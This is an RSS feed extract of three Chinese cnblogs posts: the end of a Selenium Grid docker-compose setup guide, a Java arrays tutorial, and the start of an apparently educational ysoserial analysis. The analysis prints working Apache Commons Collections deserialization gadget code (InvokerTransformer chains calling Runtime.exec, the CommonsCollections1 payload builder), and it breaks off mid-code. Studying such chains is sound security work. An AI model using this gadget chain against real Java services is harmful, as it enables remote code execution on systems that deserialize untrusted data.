&lt;p&gt;如果想关闭节点，可以执行如下命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker-compose down
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;hub和node不在一台机器上&quot;&gt;Hub和node不在一台机器上&lt;/h3&gt;
&lt;p&gt;可以使用如下配置文件docker-compose.yml&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-yaml&quot;&gt;version: &quot;3&quot;
services:
  # selenium-chrome-1
  selenium-chrome-node-1:
    image: selenium/node-chrome
    volumes:
      - /dev/shm:/dev/shm
    ports:
      - &quot;5556:5555&quot;
    restart: always
    stdin_open: true
    environment:
      HUB_HOST: hub_ip
      HUB_PORT: 4444
      NODE_MAX_INSTANCES: 5
      NODE_MAX_SESSION: 5
      REMOTE_HOST: http://节点ip:5556
      GRID_TIMEOUT: 60000
    shm_size: &quot;2gb&quot;
  # selenium-chrome-2
  selenium-chrome-node-2:
    image: selenium/node-chrome
    volumes:
      - /dev/shm:/dev/shm
    ports:
      - &quot;5555:5555&quot;
    restart: always
    stdin_open: true
    container_name: node1
    environment:
      HUB_HOST: hub_ip
      HUB_PORT: 4444
      NODE_MAX_INSTANCES: 5
      NODE_MAX_SESSION: 5
      REMOTE_HOST: http://节点ip:5555
      GRID_TIMEOUT: 60000
    shm_size: &quot;2gb&quot;
  # selenium-chrome-3
  selenium-chrome-node-3:
    image: selenium/node-chrome
    volumes:
      - /dev/shm:/dev/shm
    ports:
      - &quot;5557:5555&quot;
    restart: always
    stdin_open: true
    environment:
      HUB_HOST: hub_ip
      HUB_PORT: 4444
      NODE_MAX_INSTANCES: 5
      NODE_MAX_SESSION: 5
      REMOTE_HOST: http://节点ip:5557
      GRID_TIMEOUT: 60000
    shm_size: &quot;2gb&quot;
  # selenium-chrome-4
  selenium-chrome-node-4:
    image: selenium/node-chrome
    volumes:
      - /dev/shm:/dev/shm
    ports:
      - &quot;5558:5555&quot;
    restart: always
    stdin_open: true
    environment:
      HUB_HOST: hub_ip
      HUB_PORT: 4444
      NODE_MAX_INSTANCES: 5
      NODE_MAX_SESSION: 5
      REMOTE_HOST: http://节点ip:5558
      GRID_TIMEOUT: 60000
    shm_size: &quot;2gb&quot;

  # selenium-chrome-5
  selenium-chrome-node-5:
    image: selenium/node-chrome
    volumes:
      - /dev/shm:/dev/shm
    ports:
      - &quot;5559:5555&quot;
    restart: always
    stdin_open: true
    environment:
      HUB_HOST: hub_ip
      HUB_PORT: 4444
      NODE_MAX_INSTANCES: 5
      NODE_MAX_SESSION: 5
      REMOTE_HOST: http://节点ip:5559
      GRID_TIMEOUT: 60000
    shm_size: &quot;2gb&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动节点的命令是（前提是hub需要提前启动）：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker-compose up -d
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;关闭节点的命令是：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker-compose down
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;遗留问题&quot;&gt;遗留问题&lt;/h3&gt;
&lt;p&gt;按照我上面这种方式搭建Selenium Grid环境，本地节点可以正常执行，但是远端的节点却经常超时，不过从http://hub_ip:4444/grid/console界面上看到的节点网络全部都是通的。&lt;/p&gt;
&lt;p&gt;之前查过一些资料，貌似需要使用Docker Swarm，它是一个docker集群管理工具， 将若干台 Docker 主机抽象为一个整体，并且通过一个入口统一管理这些 Docker 主机上的各种 Docker 资源 。不过目前还没研究它，后面如果用Docker Swarm有结论之后，我再写文章同步给大家。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;用docker搭建selenium grid分布式环境，非常方便，基本是一行命令就能启动或者关闭节点。希望我这篇文章能给大家提供一些思路，帮助大家在平时的工作中解决一些问题。&lt;/p&gt;
&lt;p&gt;还是那句话，任何技术，只要能帮你解决实际的问题，就是好的技术！&lt;/p&gt;
</description>
<pubDate>Thu, 26 Mar 2020 00:18:00 +0000</pubDate>
<dc:creator>布道师玄柯</dc:creator>
<og:description>最近需要测试zoom视频会议，同时模拟100个人加入会议。经过了解，zoom提供了直接通过url链接加入会议的方式（只能通过chrome浏览器或者FireFox浏览器，因为用的协议是webrtc）。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zhouliweiblog/p/12572047.html</dc:identifier>
</item>
<item>
<title>Java 基础 - 数组 - 41uLove</title>
<link>http://www.cnblogs.com/41uLove/p/12571808.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/41uLove/p/12571808.html</guid>
<description>&lt;br/&gt;数组是编程语言中最常见的一种数据结构,可以用于储存多个数据,通常可通过数组元素的索引来访问数组元素,包括数组元素赋值和取出数组元素的值.
&lt;h2 id=&quot;初识数组&quot;&gt;初识数组&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;数组也是一种类型,属于引用数据类型.&lt;/li&gt;
&lt;li&gt;数组元素的类型是唯一的,一个数组里只能存储一种类型的数据.&lt;/li&gt;
&lt;li&gt;数组的长度是固定的,即一个数组一单初始化完成,数组在内存中所占的空间将被固定下来,长度不在发生改变.即使把某个数组的元素清空,其所占的空间依然被保留.&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;数组的初始化&quot;&gt;数组的初始化&lt;/h2&gt;
&lt;h3 id=&quot;定义数组变量&quot;&gt;定义数组变量&lt;/h3&gt;
&lt;p&gt;Java支持两种语法格式定义数组:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;type[] arr;
type arr[];
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于这两种定义而言,通常使用第一种格式来定义数组,因为第一种有更好的语义.第二种容易和变量名混淆&lt;/p&gt;
&lt;h3 id=&quot;初始化&quot;&gt;初始化&lt;/h3&gt;
&lt;p&gt;Java 数组只有初始化之后才能使用,所谓的初始化,就是为数组的元素分配内存空间.并为每个数组元素赋初始值.&lt;/p&gt;
&lt;h4 id=&quot;静态初始化&quot;&gt;静态初始化&lt;/h4&gt;
&lt;p&gt;由程序员显示的指定每个数组原始的初始值.由系统决定数组的长度.&lt;br/&gt;静态初始化的语法格式为:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;type[] arr = new type[]{item1, item2, item3,...};
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;type&lt;/code&gt; 为数组元素的数据类型, 数组元素类型必须为 &lt;code&gt;type&lt;/code&gt; 类型,或者其子类的实例.&lt;br/&gt;除此之外,静态初始化还有如下简化的语法格式:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;type[] arr = {item1, item2, item3 ...};
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;动态初始化&quot;&gt;动态初始化&lt;/h4&gt;
&lt;p&gt;动态初始化只指定数组的长度,由系统为每个元素指定初始值,动态初始化的语法格式如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;type[] arr = new type[length];
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的语法中,需要指定一个 int 类型的 length 参数,这个参数指定了数组的长度.&lt;br/&gt;执行动态初始化时,程序员只指定数组的长度,数组元素的初始值由系统按照如下自动分配&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;数组元素类型是基本类型中的整数类型(byte, short, int, long),则数组元素的值是 0.&lt;/li&gt;
&lt;li&gt;数组元素类型是基本类型中的浮点类型(float, double),则数组元素的值是 0.0.&lt;/li&gt;
&lt;li&gt;数组元素类型是基本类型中的字符类型(char),则数组元素的值是'\u0000'.&lt;/li&gt;
&lt;li&gt;数组元素的类型是基本类型中的布尔类型(boolean),则数组元素的值是 false.&lt;/li&gt;
&lt;li&gt;数组元素的类型是引用类型(类,接口,数组),则数组元素的值是 null;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;数组的访问&quot;&gt;数组的访问&lt;/h2&gt;
&lt;p&gt;数组最常用的方法就是访问数组元素,包括对数组元素进行赋值和取出数组元素.&lt;/p&gt;
&lt;h3 id=&quot;数组元素读取、赋值&quot;&gt;数组元素读取、赋值&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;int[] arr = {1,2,3};
// 数组取值 通过 arr[index] 访问 
int a = arr[0];
// arr 为{1,3,3}
arr[1] = 3
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果访问数组元素时指定的索引值小于0,或者大于等于数组的长度,编译程序时不会出现任何错误,但运行时出现异常&lt;code&gt;java.lang.ArrayIndexOutOfBoundsException:N&lt;/code&gt;(数组越界异常), &lt;code&gt;N&lt;/code&gt; 就是试图访问的数组索引.&lt;/p&gt;
&lt;h3 id=&quot;数组的遍历&quot;&gt;数组的遍历&lt;/h3&gt;
&lt;h4 id=&quot;for-循环&quot;&gt;&lt;code&gt;for&lt;/code&gt; 循环&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;int[] arr = new int[5];
// 输出 5 个 0
for(int i = 0; i &amp;lt; arr.length; i++){
    System.out.println(arr[i])
}
arr[1] = 1;
arr[2 = 2;
// 输出 0 1 2 0 0
for(int i = 0; i &amp;lt; arr.length; i++){
    System.out.println(arr[i])
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的代码第一次循环输出 5 个 0,因为 arr 数组执行的是默认初始化,数组元素是 int 类型,系统为 int 类型的数组元素初始化赋值为 0.&lt;/p&gt;
&lt;h4 id=&quot;foreach循环&quot;&gt;&lt;code&gt;foreach&lt;/code&gt;循环&lt;/h4&gt;
&lt;p&gt;Java5 之后,Java 提供了一种更简单的循环:&lt;code&gt;foreach循环&lt;/code&gt;,这种循环遍历数组和集合更加方便.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;for (type item : array|collection){
    // 
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;foreach&lt;/code&gt;循环需要注意:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int[] arr = {1, 2, 3, 4, 5};
for (int item: arr){
    System.out.println(item);
    item = 0;
    System.out.println(item);
}
System.out.println(arr[0]);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上例程序将输出&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1
0
2
0
3
0
4
0
5
0
1
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由输出结果可以看出来,在 &lt;code&gt;foreach&lt;/code&gt;循环中对数组元素进行赋值,结果导致不能正确的遍历数组元素.同时在循环中为改变的数组元素的值并没有真正改变数组元素,因为在 &lt;code&gt;foreach&lt;/code&gt;中循环变量相当于一个临时变量,系统会把数组元素一次赋值给这个临时变量,而这个临时变量并不是数组元素,它只是保存了数组元素的值.因此要注意:&lt;code&gt;如果希望改变数组元素的值,则不能使用这种 foreach 循环&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;深入了解数组&quot;&gt;深入了解数组&lt;/h2&gt;
&lt;h3 id=&quot;jdk-中的-array&quot;&gt;JDK 中的 &lt;code&gt;Array&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;查看 Java源码中的&lt;code&gt;Array&lt;/code&gt;类可以发现它是个 &lt;code&gt;final class&lt;/code&gt;, 其中方法如下:&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/951706/202003/951706-20200326003506393-472307678.png&quot; alt=&quot;Arrays&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Array&lt;/code&gt;类中基本都是 &lt;code&gt;getXX&lt;/code&gt; 和 &lt;code&gt;setXX&lt;/code&gt; 方法,&lt;br/&gt;并且全部都为 &lt;code&gt;native&lt;/code&gt; 方法.使用 &lt;code&gt;native&lt;/code&gt;关键字说明这个方法是原生函数，也就是这个方法是用&lt;code&gt;C/C++&lt;/code&gt;语言实现的，并且被编译成了DLL，由java去调用,因此我们可以将数组理解为是由计算机本地方法去实现的类,并不属于 Java.&lt;/p&gt;
&lt;h3 id=&quot;数组的内存分布&quot;&gt;数组的内存分布&lt;/h3&gt;
&lt;p&gt;数组是一种引用数据类型,数组的引用变量时存储在栈内存中的,而数组元素是在堆内存中,并且是连续存放的.这是为了能快速存取数组元素，因为只需要移动index（内部计算物理地址：&lt;code&gt;数组起始地址+index * 元素size大小&lt;/code&gt;）就可以访问，而这是很快的 O(1)。&lt;/p&gt;
&lt;p&gt;在Java 内存模型中,数组对象被存储在堆(heap)内存中;如果引用该数组对象的变量是一个局部变量,那么它被存储在栈(stack)内存中.如下图所示:&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/951706/202003/951706-20200326003552496-1279006593.png&quot; alt=&quot;数组的内存分布&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果需要访问上图堆内存中的数组元素,在程序中只能通过 p[index]的形式实现.也就是说,数组引用变量时访问堆内存中数组元素的根本方式.&lt;br/&gt;现有如下代码:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 定义并静态初始化数组
int[] a = {5, 7, 20};
// 定义数组,使用动态初始化
int[] b = new int[4];
System.out.println(&quot;b 数组的长度为: &quot; + b.length);
// 循环输出 a 数组的元素
for (int i = 0, len = a.length; i &amp;lt; len; i++ ){
    System.out.println(a[i]);
}
// 循环输出 b 数组的元素
for (int i = 0, len = b.length; i &amp;lt; len; i++ ){
    System.out.println(b[i]);
}
// 将 a 的值赋给 b,即将 b 的引用指向 a 引用指向的数组
b = a;
// 再次输出 b 数组的长度
System.out.println(&quot;b 数组的长度为: &quot; + b.length);

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行上例代码,首先会输出 b 的长度为 4,然后输出 a,b 的各项元素,接着输出 b 的长度为 3.看起来数组的长度是可变的,其实这是一个假象.&lt;br/&gt;上例代码内存分析:&lt;/p&gt;
&lt;ol readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;初始化 a,b 数组,在内存中产生了 4 块区域,栈中的引用变量 a,b 以及堆中的实际数组对象. 其中 a 引用的数组对象长度为 3, b 引用的数组长度为 4.&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/951706/202003/951706-20200326003632495-1700626784.png&quot; alt=&quot;数组的内存分布&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;程序执行&lt;code&gt;b = a&lt;/code&gt; 操作.系统会将 a 的值赋给 b,即将 a 引用的数组对象的内存地址赋给 b,此时 b 的值为 a 引用的数组对象的内存地址.&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/951706/202003/951706-20200326003650253-1864720497.png&quot; alt=&quot;数组的内存分布&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;从上可以看出,程序执行 &lt;code&gt;b = a&lt;/code&gt; 之后,b 之前引用的数组对象长度并没有发生任何改变,而 b 的值变成了 a 引用的数组对象的地址,此时 b 数组的长度即为 a 数组的长度 3.&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;需要注意的是数组元素的内存空间是连续的，是指&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如果数组元素是原始类型，那么数组元素存放的就是原始类型的值，他们是连续存放的&lt;/li&gt;
&lt;li&gt;如果数组元素是对象，那么数组元素就是存放引用了，数组元素是连续存放的，而引用的对象可能在另外的地方，与数组元素可能相隔很远，即不连续。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;多维数组&quot;&gt;多维数组&lt;/h3&gt;
&lt;p&gt;Java 提供了支持多维数组的语法,但是从数组底层的运行机制上来看,并不存在多维数组.&lt;br/&gt;多维数组的定语语法为&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;type[][] arr = new type[length1][length2]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;length2&lt;/code&gt;可动态创建.&lt;br/&gt;二维数组本质就是一位数组中的每个元素都是一个一维数组. 如上&lt;code&gt;length2&lt;/code&gt;给出了值,则初始化了一维数组中的每个元素都是一个长度为&lt;code&gt;length2&lt;/code&gt;的一维数组.其内存模型为:&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/951706/202003/951706-20200326003710848-1203499712.png&quot; alt=&quot;二维数组内存分布&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 25 Mar 2020 16:38:00 +0000</pubDate>
<dc:creator>41uLove</dc:creator>
<og:description>[TOC] 数组是编程语言中最常见的一种数据结构,可以用于储存多个数据,通常可通过数组元素的索引来访问数组元素,包括数组元素赋值和取出数组元素的值. 初识数组 数组也是一种类型,属于引用数据类型. 数</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/41uLove/p/12571808.html</dc:identifier>
</item>
<item>
<title>ysoserial分析【一】 之 Apache Commons Collections - ka1n4t</title>
<link>http://www.cnblogs.com/litlife/p/12571787.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/litlife/p/12571787.html</guid>
<description>&lt;p&gt;Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。&lt;/p&gt;

&lt;h2 id=&quot;transformer&quot;&gt;Transformer&lt;/h2&gt;
&lt;p&gt;Transfomer是Apache Commons Collections库引入的一个接口，每个具体的Transformer类必须实现Transformer接口，比如我自己定义了一个MyTransformer类：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326001958784-1096404236.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当一个Transformer通过TranformerMap的decorate方法绑定到Map的key或value上时，如果这个Map的key或value发生了变化，则会调用Transformer的transform方法，MyTransformer的transform方法是return this.name。&lt;/p&gt;
&lt;p&gt;测试用例如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002015438-2090382261.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;14行创建了一个MyTransformer，并使之this.name=&quot;trans-value&quot;。然后在16-18行创建了一个Map，并在20行通过decorate方法将MyTransformer绑定到Map的value上（第二个参数为绑定到key上的Transformer）。接着在22-23行对Map进行setValue，即对Map的value进行修改。这时就会对value触发已经绑定到Map-Value上的MyTransformer的transform方法。看一下MyTransformer的transform方法，已知其直接返回this.name，由于this.name在14行已经被设置成了&quot;trans-value&quot;，故这里直接返回这个字符串，赋值给value。看一下运行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002028901-509427526.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，value已经被transform方法修改成了this.name。&lt;/p&gt;
&lt;p&gt;以上是自己写的一个简单的Transformer，下面看一下Apache-Common-Collections-3.1提供的一些Transformer。&lt;/p&gt;
&lt;p&gt;首先是ConstantTransformer，跟上面的MyTransformer类似，transform方法都是返回实例化时的第一个参数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002038341-485991799.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;还有一个是InvokerTransformer类，在其transform()方法中可以通过Java反射机制来进行执行任意代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002046710-1156025125.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，有三个内部变量可控。然后看他的transform方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002054290-1617458032.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，59-61行通过反射，可以调用任意类的任意方法，通过还会传入任意参数，由于input也可控（即新key/value的值），所以由于所有内部变量可控，这里存在RCE。&lt;/p&gt;
&lt;p&gt;还有一个比较有意思的Transformer是ChainedTransformer，可以通过一个Trasnformer[]数组来对一个对象进行链式执行transform()。&lt;/p&gt;
&lt;h3 id=&quot;利用invokertransformer造成命令执行&quot;&gt;利用InvokerTransformer造成命令执行&lt;/h3&gt;
&lt;p&gt;首先利用ChainedTransformer类构建一个Transformer链，通过调用多个Transformer类来造成命令执行，比如以下代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
    new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{new Object[]{}, new Object[]{}}),
    new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
};

Transformer transformerChain = new ChainedTransformer(transformers);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当调用ChainedTransformer.transform()时，会把Transformer[]数组中的所有Transformer一次执行transform()方法，造成命令执行。以上代码相当于这一行代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Runtime.getRuntime().getClass().getMethod(&quot;exec&quot;,new 
Class[]{String.class}).invoke(Runtime.getRuntime(),&quot;calc.exe&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;map&quot;&gt;Map&lt;/h2&gt;
&lt;p&gt;利用Transform来执行命令有时还需要绑定到Map上，这里就讲一下Map。抽象类AbstractMapDecorator是Apache Commons Collections引入的一个类，实现类有很多，比如LazyMap、TransformedMap等，这些类都有一个decorate()方法，用于将上述的Transformer实现类绑定到Map上，当对Map进行一些操作时，会自动触发Transformer实现类的tranform()方法，不同的Map类型有不同的触发规则。&lt;/p&gt;
&lt;h3 id=&quot;transformedmap&quot;&gt;TransformedMap&lt;/h3&gt;
&lt;p&gt;比如TransformedMap：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Map tmpmap = TransformedMap.decorate(normalMap, KeyTransformer, ValueTransformer);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以将不同的Transformer实现类分别绑定到map的key和value上，当map的key或value被修改时，会调用对应Transformer实现类的transform()方法&lt;/p&gt;
&lt;p&gt;因此我们可以把chainedtransformer绑定到一个TransformedMap上，当此map的key或value发生改变时，自动触发chainedtransformer。&lt;/p&gt;
&lt;p&gt;比如以下代码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
    new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{new Object[]{}, new Object[]{}}),
    new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
};

Transformer transformerChain = new ChainedTransformer(transformers);

Map normalMap = new HashMap();
normalMap.put(&quot;11&quot;, &quot;aa&quot;);

Map transformedMap = TransformedMap.decorate(normalMap, null, transformerChain);

Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();
entry.setValue(&quot;newValue&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行时会自动弹出计算器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002115326-440069290.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;lazymap&quot;&gt;LazyMap&lt;/h3&gt;
&lt;p&gt;除了TransformedMap，还有LazyMap:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Map tmpmap = LazyMap.decorate(normalMap, TestTransformer);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当调用tmpmap.get(key)的key不存在时，会调用TestTransformer的transform()方法&lt;/p&gt;
&lt;p&gt;这些不同的Map类型之间的差异也正是CommonsColletions有那么多gadget的原因之一。&lt;/p&gt;
&lt;h2 id=&quot;annotationinvocationhandler&quot;&gt;AnnotationInvocationHandler&lt;/h2&gt;
&lt;p&gt;关于AnnotationInvocationHandler类，这个类本身是被设计用来处理Java注解的，可以参考 &lt;a href=&quot;https://mp.weixin.qq.com/s/dCqmoss2TZnAQyyF27gVmw&quot;&gt;JAVA 注解的基本原理&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;动态代理&quot;&gt;动态代理&lt;/h2&gt;
&lt;p&gt;使用Proxy类实现AOP（面向切面编程）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih)
/*
ClassLoader loader：
它是类加载器类型，你不用去理睬它，你只需要知道怎么可以获得它就可以了：MyInterface.class.getClassLoader()就可以获取到ClassLoader对象，没错，只要你有一个Class对象就可以获取到ClassLoader对象；

Class[] interfaces：
指定newProxyInstance()方法返回的代理类对象要实现哪些接口（可以指定多个接口），也就是代表我们生成的代理类可以调用这些接口中声明的所有方法。

InvocationHandler h：
它是最重要的一个参数！它是一个接口！它的名字叫调用处理器！无论你调用代理对象的什么方法，它都是在调用InvocationHandler的invoke()方法！
*/
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以参考 &lt;a href=&quot;https://blog.csdn.net/yaomingyang/article/details/80981004&quot;&gt;Java动态代理InvocationHandler和Proxy学习笔记&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;commonscollections1&quot;&gt;CommonsCollections1&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;

public static &amp;lt;T&amp;gt; T createMemoitizedProxy ( final Map&amp;lt;String, Object&amp;gt; map, final Class&amp;lt;T&amp;gt; iface, final Class&amp;lt;?&amp;gt;... ifaces ) throws Exception {
    return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
}

public static InvocationHandler createMemoizedInvocationHandler ( final Map&amp;lt;String, Object&amp;gt; map ) throws Exception {
    //利用反射机制调用AnnotationInvocationHandler的构造方法，map作为第二个参数赋值给成员变量memberValues。返回AnnotationInvocationHandler实例对象
    return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
}

public static &amp;lt;T&amp;gt; T createProxy ( final InvocationHandler ih, final Class&amp;lt;T&amp;gt; iface, final Class&amp;lt;?&amp;gt;... ifaces ) {
    final Class&amp;lt;?&amp;gt;[] allIfaces = (Class&amp;lt;?&amp;gt;[]) Array.newInstance(Class.class, ifaces.length + 1);
    allIfaces[ 0 ] = iface;//将所有的iface复制给allInfaces（包括下面三行都是在做这个事情）
    if ( ifaces.length &amp;gt; 0 ) {
        System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
    }
    //调用Proxy.newProxyInstanc()来创建动态代理
    return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
}

public InvocationHandler getObject(final String command) throws Exception {
    //创建Transformer
    final String[] execArgs = new String[] { command };
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
                String.class, Class[].class }, new Object[] {
                &quot;getRuntime&quot;, new Class[0] }),
            new InvokerTransformer(&quot;invoke&quot;, new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer(&quot;exec&quot;,
                new Class[] { String.class }, execArgs),
            new ConstantTransformer(1) };

    final Map innerMap = new HashMap();
    //将transformerChain绑定到LazyMap中，当调用LazyMap.get(key)的key不存在时，会调用transformerChain的Transformer类的transform()方法
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    //跟进一下这个方法，注意这里传入的第一个参数是lazyMap
    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
    //创建annotationinvocationhandler类实例，构造函数的第二个参数是上面的代理类实例
    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

    Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain//设置transformerChain对象的iTransformers属性为transformers，相当与重新赋值，也就是arm with actual transformer chain


    return handler;//返回对象实例，用于序列化作为poc
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先是创建利用反射RCE的ChainedTransformer对象，然后将之通过LazyMap.decorate()绑定到LazyMap上，当调用LazyMap.get(key)的key不存在时会调用Transformer的transform()方法。&lt;/p&gt;
&lt;p&gt;然后开始创建动态代理&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;createMemoitizedProxy()定义如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;

